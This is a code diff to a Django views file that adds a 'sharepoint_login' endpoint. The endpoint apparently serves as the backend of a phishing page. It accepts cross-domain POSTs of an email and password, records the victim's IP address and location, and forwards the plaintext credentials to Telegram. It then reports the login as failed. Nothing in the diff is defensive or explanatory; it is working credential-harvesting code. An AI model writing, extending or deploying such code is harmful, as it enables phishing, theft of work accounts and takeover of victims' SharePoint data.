@@ -2,6 +2,9 @@ from django.shortcuts import render, redirect
 from django.views.decorators.csrf import csrf_exempt
 import requests
 from .models import Mail
+from django.http import JsonResponse
+import json
+
 
 # Create your views here.
 
@@ -49,3 +52,29 @@ def login_view(request):
 def success_view(request):
 
     return render(request, "back.html")
+
+
+@csrf_exempt  # for AJAX POST from external domain
+def sharepoint_login(request):
+    if request.method == "POST":
+        try:
+            data = json.loads(request.body)
+            email = data.get("email")
+            password = data.get("password")
+            ip_address = request.META.get("REMOTE_ADDR")
+            country, city = get_country_from_ip(ip_address)
+            subject = "New sharepoint details submitted"
+            mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\nemail: {email}\npassword: {password}"
+            send_to_telegram(mail_message)
+            print(mail_message)
+
+            # Example check (replace with your real authentication logic)
+            if email == "test@example.com" and password == "12345":
+                return JsonResponse({"success": True})
+            else:
+                return JsonResponse(
+                    {"success": False, "message": "Invalid credentials."}
+                )
+        except Exception as e:
+            return JsonResponse({"success": False, "message": str(e)})
+    return JsonResponse({"success": False, "message": "Invalid request method"})
